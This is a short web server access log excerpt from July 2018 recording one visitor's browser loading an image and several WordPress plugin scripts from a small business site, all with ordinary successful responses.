98.102.69.90 - - [25/Jul/2018:06:45:02 -0700] "GET /wp-content/uploads/2018/07/HPPWXL8000.jpg HTTP/1.1" 200 322722 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:45:02 -0700] "GET /wp-content/plugins/nivo-slider/scripts/nivo-slider/jquery.nivo.slider.pack.js?ver=4.9.7 HTTP/1.1" 200 3437 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:45:02 -0700] "GET /wp-content/plugins/jetpack/modules/wpgroho.js?ver=4.9.7 HTTP/1.1" 200 817 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
98.102.69.90 - - [25/Jul/2018:06:45:02 -0700] "GET /wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=5.0.3 HTTP/1.1" 200 4449 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
